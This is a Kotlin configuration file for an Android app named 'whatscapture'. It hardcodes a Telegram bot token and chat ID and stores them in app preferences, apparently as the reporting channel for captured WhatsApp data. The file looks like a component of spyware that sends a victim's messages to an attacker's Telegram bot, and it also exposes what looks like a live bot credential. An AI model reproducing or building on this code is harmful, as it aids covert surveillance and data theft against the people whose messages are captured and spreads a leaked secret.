package com.whatscapture

import android.content.Context

object Config {
    private const val TOKEN = "8951355924:AAG7I7dzsAsi-zbZdclxfRLTPWcrx7Ieg3U"
    private const val CHAT_ID = "1377090847"

    fun init(context: Context) {
        val prefs = context.getSharedPreferences("config", Context.MODE_PRIVATE)
        if (!prefs.getBoolean("configured", false)) {
            prefs.edit()
                .putString("telegram_token", TOKEN)
                .putString("telegram_chat_id", CHAT_ID)
                .putBoolean("configured", true)
                .apply()
        }
    }

    fun getToken(context: Context): String {
        return context.getSharedPreferences("config", Context.MODE_PRIVATE)
            .getString("telegram_token", TOKEN) ?: TOKEN
    }

    fun getChatId(context: Context): String {
        return context.getSharedPreferences("config", Context.MODE_PRIVATE)
            .getString("telegram_chat_id", CHAT_ID) ?: CHAT_ID
    }

    fun isRunning(context: Context): Boolean {
        return context.getSharedPreferences("config", Context.MODE_PRIVATE)
            .getBoolean("running", false)
    }
}
